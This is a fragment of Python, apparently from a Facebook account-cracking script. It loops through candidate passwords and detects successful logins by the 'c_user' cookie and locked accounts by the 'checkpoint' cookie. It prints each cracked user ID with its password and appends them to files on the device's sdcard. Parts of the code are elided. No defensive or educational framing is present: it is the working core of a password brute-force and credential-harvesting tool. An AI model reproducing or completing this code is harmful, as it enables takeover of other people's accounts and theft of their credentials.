    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('    \033[1;32m(am-OK😍)  ' +uid+ ' | ' +ps+    '\033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/am-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;92m\x1b[38;5;208m(am-CP😭)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/am-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[am] [%s/%s] [OK %s  CP %s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
